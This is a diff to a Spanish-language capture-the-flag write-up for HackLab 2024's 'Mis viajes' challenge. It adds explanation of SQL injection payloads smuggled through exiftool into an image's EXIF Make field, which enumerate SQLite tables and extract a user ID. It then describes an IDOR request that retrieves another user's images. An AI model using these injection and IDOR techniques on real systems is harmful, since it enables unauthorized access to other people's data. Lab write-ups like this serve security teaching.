@@ -22,29 +22,21 @@ Resultado: versión `3.40.1` → SQLite.
 
 ![Desafío 27 - Mis viajes (HackLab 2024) - imagen 1](assets/01.png)
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 2](assets/02.png)
-
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 3](assets/03.png)
-
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 4](assets/04.png)
-
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 5](assets/05.png)
-
-Se enumeran las tablas de `sqlite_master`:
+Se enumeran las tablas de `sqlite_master`. El payload concatena (`|| ... ||`) el resultado de una subconsulta dentro del campo `Make`, por lo que la subconsulta debe devolver una **única fila** (si devuelve varias, la concatenación falla). Por eso se usa `LIMIT 1 OFFSET X`: `LIMIT 1` asegura un solo resultado y `OFFSET X` permite recorrer la tabla fila por fila incrementando `X` (OFFSET 0 = 1er resultado, OFFSET 1 = 2do, etc.).
 
 ```bash
 exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 0)||'" test.jpg_original
 exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 1)||'" test.jpg_original
+exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 2)||'" test.jpg_original
 ```
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 6](assets/06.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 2](assets/02.png)
 
 ```bash
-exiftool -Make="'||(SELECT name FROM sqlite_master LIMIT 1 OFFSET 2)||'" test.jpg_original
 exiftool -Make="'||(SELECT sql FROM sqlite_master WHERE name='images')||'" test.jpg_original
 ```
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 7](assets/07.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 3](assets/03.png)
 
 Se obtiene el `user_id` de la tabla `images`:
 
@@ -58,15 +50,27 @@ ID encontrado:
 1089b4a3-b6d0-450d-9c8a-b120b30bcb04
 ```
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 8](assets/08.png)
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 4](assets/04.png)
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 9](assets/09.png)
+### Cómo se llega al endpoint
 
-Se copia el ID del usuario y se envía al endpoint correspondiente.
+El endpoint no hay que adivinarlo: está en el propio código del front. Al revisar el `script.js` de la galería (visible desde las DevTools del navegador, pestaña *Sources*), se ve que la lista de imágenes se carga con una llamada del tipo:
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 10](assets/10.png)
+```javascript
+fetch(`/images/${USER_ID}`)
+```
 
-![Desafío 27 - Mis viajes (HackLab 2024) - imagen 11](assets/11.png)
+Es decir, el front pide las imágenes a `/images/<user_id>`, tomando el `USER_ID` desde el DOM (p. ej. `document.getElementById("id_user").value`). Ese valor es del lado del cliente, así que es totalmente manipulable: si el backend no valida que el `user_id` solicitado coincida con el de la sesión autenticada, se puede pedir las imágenes de cualquier usuario (IDOR).
+
+Con el `user_id` de la víctima extraído por la inyección SQL, ya no hacen falta más payloads: basta con reproducir esa misma llamada apuntando al ID ajeno. Se abre directamente en el navegador:
+
+```
+/images/1089b4a3-b6d0-450d-9c8a-b120b30bcb04
+```
+
+La respuesta es un JSON con las imágenes de ese usuario, cuyo campo `description` contiene la flag.
+
+![Desafío 27 - Mis viajes (HackLab 2024) - imagen 5](assets/05.png)
 
 ## Flag
 
